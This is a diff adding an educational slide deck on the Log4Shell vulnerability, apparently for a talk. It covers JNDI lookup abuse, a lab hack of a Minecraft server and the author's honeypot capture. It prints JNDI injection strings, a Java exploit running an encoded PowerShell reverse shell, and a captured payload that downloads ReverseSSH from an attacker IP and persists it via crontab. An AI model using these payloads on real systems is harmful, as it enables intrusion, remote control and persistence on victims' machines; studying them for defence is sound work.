@@ -1,0 +1,367 @@
+<!doctype html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+	<title>Log4Shell</title>
+
+	<link rel="stylesheet" href="dist/reset.css">
+	<link rel="stylesheet" href="dist/reveal.css">
+	<link rel="stylesheet" href="dist/theme/black.css">
+
+	<!-- Theme used for syntax highlighted code -->
+	<link rel="stylesheet" href="plugin/highlight/monokai.css">
+</head>
+
+<body>
+	<div class="reveal">
+		<div class="slides">
+			<section>
+				<h1>Log4Shell</h1>
+				How it works and how it is exploited
+			</section>
+			<section>
+				<h2>Topics</h2>
+				<ul>
+					<li class="fragment">How does Log4Shell work 🤔</li>
+					<li class="fragment">Hacking a vulnerable Minecraft server 🥷</li>
+					<li class="fragment">How is Log4Shell exploited in the wild? 🌳</li>
+					<li class="fragment">How I was attacked 😱</li>
+				</ul>
+			</section>
+			<section>
+				<h2>How does Log4Shell work 🤔</h2>
+			</section>
+			<section>
+				<img src="assets/img/log4j-icon.png" width="600">
+				<p>Open source logging framework for Java</p>
+				<p class="fragment">Used in LOTS of Java applications</p>
+			</section>
+			<section>
+				<h2>Log4Shell</h2>
+				<span class="fragment">A.K.A. CVE-2021-44228</span>
+				<span class="fragment">, CVE-2021-45046, CVE-2021-45105 and CVE-2021-44832</span>
+				
+				<img src="assets/img/log4shell-cve.png" width="900" class="fragment">
+			</section>
+			<section>
+				<p>Log4J feature: Lookup at logging time</p>
+
+				<div class="fragment">
+					<p>Java Lookup:</p>
+					<pre><code data-trim data-noescape>${java:version} → Java version 1.7.0_67</code></pre>
+				</div>
+			</section>
+			<section>
+				<h2>The Bad lookup: JNDI Lookup</h2>
+				<div class="fragment"><small>Java Naming and Directory Interface</small></div>
+				<img class="fragment" src="assets/img/jndiarch.gif" width="450">
+				<pre class="fragment"><code data-trim data-noescape>${jndi:ldap://example.com/file} → 🌩️</code></pre>
+			</section>
+			<section>
+				<h2>How can this be abused?</h2>
+
+				
+				<div class="r-stack">
+					<ol>
+						<li class="fragment">JNDI lookup payload is placed in logs <pre><code data-trim data-noescape>${jndi:ldap://attacker.com/exploit}</code></pre></li>
+						<li class="fragment">Log4J contacts the LDAP server for information</li>
+						<li class="fragment">LDAP server redirects Log4J to an HTTP server which hosts a Java class file</li>
+						<li class="fragment">Content of the class file is downloaded and executed</li>
+					</ol>
+					<img class="fragment" src="assets/img/explotion.gif" width="800">
+				</div>
+			</section>
+			<section>
+				<img src="assets/img/meme3.jpeg" class="r-stretch">
+			</section>
+			<section data-background-image="assets/img/hackerman.jpeg">
+				<h2>Hacking a vulnerable Minecraft server 🥷</h2>
+			</section>
+			<section>
+				<h2>Hacking Setup</h2>
+
+				<p>Two (virtual) computers in the same network</p>
+				<ol>
+					<li class="fragment">Victim's machine 🙈</li>
+					<li class="fragment">Attacker's machine 🦁</li>
+				</ol>
+			</section>
+
+			<section>
+				<h2>Victim's machine 🙈</h2>
+
+				<ul>
+					<li class="fragment">Windows 10 (with virus scanner disabled 😅)</li>
+					<li class="fragment">Minecraft Server (1.8.8 → Vulnerable to Log4Shell)</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Attacker's machine 🦁</h2>
+
+				<ul>
+					<li class="fragment">Kali Linux</li>
+					<li class="fragment">Minecraft Client</li>
+					<li class="fragment">Marshalsec LDAP referer</li>
+					<li class="fragment">Http Server</li>
+					<li class="fragment">The (compiled and obfuscated) exploit payload</li>
+					<li class="fragment">Netcat Listener (for incoming connections)</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>The Exploit</h2>
+				<small>[The code which are executing on the victim's machine 😈]</small>
+
+				<pre class="fragment"><code data-trim data-noescape data-line-numbers="1-10|5">
+					public class Log4jRCE {
+						static {
+							try {
+								Runtime.getRuntime()
+									.exec("powershell.exe -exec bypass -enc IwBSAGEAcwB0AGEALQBtAG8AdQBzAGUAcwAgAEEAbQBzAGkALQBTAGMAYQBuAC0AQgB1AGYAZgBlAHIAIABwAGEAdABjAGgAIABcAG4ADQAKACQAaABjAHIAcABiACAAPQAgAEAAIgANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABoAGMAcgBwAGIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZQBlAHEAZgBxAGgALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAAJABoAGMAcgBwAGIADQAKAA0ACgAkAHkAYQB5AG8AaABkAHEAIAA9ACAAWwBoAGMAcgBwAGIAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgAkACgAWwBjAEgAQQBSAF0AKABbAGIAeQB0AEUAXQAwAHgANgAxACkAKwBbAGMASABhAHIAXQAoAFsAYgBZAFQARQBdADAAeAA2AGQAKQArAFsAYwBoAEEAcgBdACgAWwBCAFkAdABlAF0AMAB4ADcAMwApACsAWwBjAEgAYQBSAF0AKABbAEIAWQB0AGUAXQAwAHgANgA5ACkAKwBbAGMASABhAHIAXQAoADQANgApACsAWwBDAGgAYQBSAF0AKABbAGIAWQB0AGUAXQAwAHgANgA0ACkAKwBbAGMAaABBAFIAXQAoADEAMAA4ACsANgAwAC0ANgAwACkAKwBbAGMASABBAFIAXQAoAFsAYgB5AHQARQBdADAAeAA2AGMAKQApACIAKQANAAoAJABtAHcAagB6AGsAaAAgAD0AIABbAGgAYwByAHAAYgBdADoAOgBHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKAAkAHkAYQB5AG8AaABkAHEALAAgACIAJAAoAFsAYwBoAEEAUgBdACgANgA1ACoANQA3AC8ANQA3ACkAKwBbAGMAaABBAHIAXQAoAFsAYgBZAHQARQBdADAAeAA2AGQAKQArAFsAQwBIAGEAUgBdACgAWwBCAFkAdABFAF0AMAB4ADcAMwApACsAWwBjAGgAYQByAF0AKABbAGIAeQB0AGUAXQAwAHgANgA5ACkAKwBbAGMASABBAHIAXQAoADgAMwApACsAWwBjAGgAYQByAF0AKABbAEIAeQBUAEUAXQAwAHgANgAzACkAKwBbAGMAaABBAFIAXQAoADkANwAqADkALwA5ACkAKwBbAEMAaABBAHIAXQAoAFsAQgBZAFQAZQBdADAAeAA2AGUAKQArAFsAYwBoAGEAcgBdACgAWwBiAHkAdABFAF0AMAB4ADQAMgApACsAWwBjAEgAQQByAF0AKAAxADEANwApACsAWwBDAEgAQQBSAF0AKAAzADUAKwA2ADcAKQArAFsAQwBoAGEAUgBdACgAMQAwADIAKwA0ADEALQA0ADEAKQArAFsAQwBoAGEAcgBdACgAWwBiAFkAVABlAF0AMAB4ADYANQApACsAWwBjAGgAYQBSAF0AKAAxACsAMQAxADMAKQApACIAKQANAAoAJABwACAAPQAgADAADQAKAFsAaABjAHIAcABiAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQAbQB3AGoAegBrAGgALAAgAFsAdQBpAG4AdAAzADIAXQA1ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJABwACkADQAKACQAdwBmAHAAegAgAD0AIAAiADAAeABCADgAIgANAAoAJABiAHYAbABmACAAPQAgACIAMAB4ADUANwAiAA0ACgAkAGgAZQBhAHAAIAA9ACAAIgAwAHgAMAAwACIADQAKACQAcgBxAHIAYwAgAD0AIAAiADAAeAAwADcAIgANAAoAJAB5AGcAbwBxACAAPQAgACIAMAB4ADgAMAAiAA0ACgAkAGIAeABkAHgAIAA9ACAAIgAwAHgAQwAzACIADQAKACQAaABsAGEAagBjACAAPQAgAFsAQgB5AHQAZQBbAF0AXQAgACgAJAB3AGYAcAB6ACwAJABiAHYAbABmACwAJABoAGUAYQBwACwAJAByAHEAcgBjACwAKwAkAHkAZwBvAHEALAArACQAYgB4AGQAeAApAA0ACgBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBDAG8AcAB5ACgAJABoAGwAYQBqAGMALAAgADAALAAgACQAbQB3AGoAegBrAGgALAAgADYAKQANAAoADQAKACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxADQAMQAuADEAMwAxACIALAA5ADgAOQA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==")
+									.waitFor();
+							} catch (Exception e) {
+								e.printStackTrace();
+							}
+						}
+					}
+				</code></pre>
+			</section>
+
+			<section>
+				<h2>The Attack</h2>
+
+				<video controls class="r-stretch" src="assets/video/hack.mp4"></video>
+			</section>
+
+			<section data-background-video="assets/video/hackerman1.mp4" 
+			data-background-video-loop data-background-video-muted>
+			</section>
+
+			<section>
+				<h2>How is Log4Shell exploited in the wild? 🌳</h2>
+
+				<small>And why is the Internet still working?</small>
+			</section>
+
+			<section>
+				<h2>Current State: <br>Not as bad as feared</h2>
+				<small class="fragment">...yet</small>
+			</section>
+
+			<section>
+				<img src="assets/img/CISO-report.png">
+				<small>therecord.media - 10.01.2022</small>
+			</section>
+
+			<section>
+				<h2>Automated exploitation in progress</h2>
+				<img class="r-stretch" src="assets/img/greynoise.png">
+				<small>greynoise.io - With Log4J RCE Attempt filter</small>
+			</section>
+
+			<section>
+				<h2>VMWare Horizon Campaign</h2>
+				<img src="assets/img/vmware-horizon.png" alt="">
+				<small>Large scale Campaign targeting unpatched internet facing VMWare Horizon installations - 11.01.2022</small>
+			</section>
+
+			<section>
+				<img src="assets/img/ransom-note.jpg" alt="">
+				<small>Night Sky ransom note</small>
+			</section>
+
+			<section>
+				<img src="assets/img/but-why-meme.jpeg" width=800>
+				<p>Some Theories</p>
+			</section>
+
+			<section>
+				<h2>Theory 1</h2>
+				<p>Bad guys can't code java 🔥</p>
+				<img src="assets/img/patrick-grey.jpeg" alt="">
+				<small>Patrick Grey - Host of the Risky Business podcast</small>
+			</section>
+
+			<section>
+				<h2>Theory 2</h2>
+				<p>Log processing can be unpredictable in enterprise apps</p>
+			</section>
+
+			<section>
+				<h2>Theory 3</h2>
+				<p>Attackers wait to use the compromised machines when attention wanders off</p>
+			</section>
+
+			<section>
+				<h2>How I was attacked 😱</h2>
+				<p>My 🍯 story</p>
+			</section>
+
+			<section>
+				<img src="assets/img/honeypot.png" alt="">
+				<small>I found an interesting little project. I quickly installed it on a vps server</small>
+			</section>
+
+			<section>
+				<h2>Then the waiting game started</h2>
+				<img src="assets/img/now-my-watch-begins-meme.gif" alt="">
+			</section>
+
+			<section>
+				<h2>Timeline</h2>
+				<div class="r-stack">
+					<ul>
+						<li class="fragment">15.12.21 🍯 installed</li>
+						<li class="fragment">16.12.21 first automated scans incoming</li>
+						<li class="fragment">nothing 🥱</li>
+						<li class="fragment">nothing 😔</li>
+						<li class="fragment">03.01.22 first user joins my honeypot server</li>
+						<li class="fragment">13.01.22 someone tries to hack me 🥰</li>
+					</ul>
+					<img class="fragment" src="assets/img/yes.gif" alt="">
+				</div>
+			</section>
+			
+			<section>
+				<h2>Looking at the logs</h2>
+				<pre><code data-trim data-noescape>
+					New connection from 195.154.52.77:36734
+					Received handshake: 754 2 143.244.178.253:25565
+					Testing text: FermatSleep
+					FermatSleep joined the server
+					Testing text: ${jndi:ldap://195.154.52.77:1389/a}
+					Fetching payload for: jndi:ldap://195.154.52.77:1389/a
+					Saved payload to file d014fd3d-e92b-4479-b568-50d8a40c89d0.class
+				</code></pre>
+			</section>
+
+			<section>
+				<h2>Decompiling the payload</h2>
+				<pre><code data-trim data-noescape data-line-numbers="1-24|22">
+					public class Exploit {
+						public static String script;
+						
+						public static String execCmd(final String s) {
+							String s2 = null;
+							final String[] cmdarray = { "/bin/sh", "-c", s };
+							try (final InputStream inputStream = Runtime.getRuntime().exec(cmdarray).getInputStream();
+								final Scanner useDelimiter = new Scanner(inputStream).useDelimiter("\\A")) {
+								s2 = (useDelimiter.hasNext() ? useDelimiter.next() : null);
+							}
+							catch (IOException ex) {
+								ex.printStackTrace();
+							}
+							return s2;
+						}
+						
+						public Exploit() throws Exception {
+							execCmd(Exploit.script);
+						}
+						
+						static {
+							Exploit.script = "url=http://195.154.52.77:8000/mc_server.jar;remote_ip=195.154.52.77;port=$(wget -O- http://$remote_ip:8000/port 2>/dev/null) ;[ $? -ne 0 ] && port=$(curl http://$remote_ip:8000/port 2>/dev/null) ;wget --no-check-certificate $url > /dev/null 2>&1 || curl -k -O $url > /dev/null 2>&1 ;chmod +x ./mc_server.jar;nohup ./mc_server.jar -b $port > /dev/null 2>&1 &cmd=\"$(pwd)/mc_server.jar -b $port\";(crontab -l ;  echo \"@reboot $cmd\" ) | sort - | uniq - | crontab - ;echo done ;";
+						}
+					}
+				</code></pre>
+			</section>
+
+			<section>
+				<h2>The exploitation command</h2>
+				<pre><code data-trim data-noescape data-line-numbers="1-9|1|2|3-4|5|6|7|8">url=http://195.154.52.77:8000/mc_server.jar
+remote_ip=195.154.52.77
+port=$(wget -O- http://$remote_ip:8000/port 2>/dev/null) 
+[ $? -ne 0 ] && port=$(curl http://$remote_ip:8000/port 2>/dev/null) 
+wget --no-check-certificate $url > /dev/null 2>&1 || curl -k -O $url > /dev/null 2>&1 
+chmod +x ./mc_server.jar
+nohup ./mc_server.jar -b $port > /dev/null 2>&1 &cmd="$(pwd)/mc_server.jar -b $port"
+(crontab -l echo "@reboot $cmd" ) | sort - | uniq - | crontab - 
+echo done
+				</code></pre>
+			</section>
+
+			<section>
+				<h2>mc_server.jar 🤔</h2>
+				<img src="assets/img/mc_server-download.png" alt="">
+				<small>Let's have a look at it</small>
+			</section>
+
+			<section>
+				<h2>Investigating the file</h2>
+				<img src="assets/img/file.png" alt="">
+				binary was generated from go
+				<img src="assets/img/strings.png" alt="">
+				also find something which looks like a password and also a ssh pubkey
+				try to find out how they are used in ghidra but my reverse engineering skills are limited
+			</section>
+
+			<section>
+				<h2>ReverseSSH</h2>
+				<img src="assets/img/reverse-ssh.png" alt="">
+				<img src="assets/img/reverse-ssh-features.png" alt="">
+				show how it is started using -b command
+			</section>
+
+
+			<section>
+				virustotal confirms ReverseSSh content
+				Who are those guys?
+				poneytelecom
+				https://www.abuseipdb.com/check/195.154.52.77
+				contacting them
+				new attack from other ip
+				https://www.abuseipdb.com/check/185.233.105.120
+				contacting that host
+				the internet has also found that out
+				https://blog.bithole.dev/log4shell-mc.html
+				https://www.reddit.com/r/admincraft/comments/s1xqp3/identifying_potential_exposure_following_log4j/
+			</section>
+
+			<section>
+				<h2>Sources</h2>
+
+				<ul>
+					<li><a href="https://en.wikipedia.org/wiki/Log4Shell">en.wikipedia.org/wiki/Log4Shell</a></li>
+					<li><a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Log4J lookups</a></li>
+					<li><a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">JNDI architecture</a></li>
+					<li><a href="https://tryhackme.com/room/solar">Tryhackme exploit walkthrough</a></li>
+					<li><a href="https://www.youtube.com/watch?v=7qoPDq41xhQ">John Hammond Log4Shell explanation</a></li>
+					<li><a href="https://github.com/mbechler/marshalsec">LDAP referer</a></li>
+					<li><a href="https://therecord.media/cisa-director-log4shell-has-not-resulted-in-significant-government-intrusions-yet/">CISA Report</a></li>
+					<li><a href="https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22">greynoise.io Log4J attacks</a></li>
+					<li><a href="https://risky.biz/">Risky.biz information security podcast</a></li>
+					<li><a href="https://www.cyberscoop.com/chinese-hackers-log4j-night-sky-ransomware-microsoft/">VMWare Horizon ransomware campaign</a></li>
+					<li><a href="https://github.com/Adikso/minecraft-log4j-honeypot">Minecraft Honeypot</a></li>
+					<li><a href="https://github.com/Fahrj/reverse-ssh">ReverseSSH</a></li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Presentation is published on github</h2>
+			</section>
+		
+
+		</div>
+	</div>
+
+	<script src="dist/reveal.js"></script>
+	<script src="plugin/notes/notes.js"></script>
+	<script src="plugin/markdown/markdown.js"></script>
+	<script src="plugin/highlight/highlight.js"></script>
+	<script>
+		// More info about initialization & config:
+		// - https://revealjs.com/initialization/
+		// - https://revealjs.com/config/
+		Reveal.initialize({
+			hash: true,
+
+			// Learn about plugins: https://revealjs.com/plugins/
+			plugins: [RevealMarkdown, RevealHighlight, RevealNotes]
+		});
+	</script>
+</body>
+
+</html>
